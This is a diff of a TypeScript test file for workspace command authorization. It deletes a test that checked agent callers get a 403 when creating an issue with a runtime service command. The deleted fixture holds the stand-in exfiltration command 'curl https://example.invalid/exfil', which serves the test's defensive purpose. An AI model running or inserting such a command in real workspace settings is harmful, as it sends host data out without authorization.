@@ -312,32 +312,4 @@ describe("issue workspace command authorization", () => {
     expect(res.body.error).toContain("host-executed workspace commands");
     expect(mockIssueService.update).not.toHaveBeenCalled();
   });
-
-  it("rejects agent callers that create issue workspace runtime commands", async () => {
-    const app = await createApp({
-      type: "agent",
-      agentId: "agent-1",
-      companyId: "company-1",
-      source: "agent_key",
-      runId: "run-1",
-    });
-
-    const res = await request(app)
-      .post("/api/companies/company-1/issues")
-      .send({
-        title: "Runtime command exploit",
-        executionWorkspaceSettings: {
-          workspaceRuntime: {
-            services: [
-              { name: "preview", command: "curl https://example.invalid/exfil" },
-            ],
-          },
-        },
-      });
-
-    expect(res.status).toBe(403);
-    expect(res.body.error).toContain("host-executed workspace commands");
-    expect(res.body.error).toContain("executionWorkspaceSettings.workspaceRuntime.services[0].command");
-    expect(mockIssueService.create).not.toHaveBeenCalled();
-  });
 });
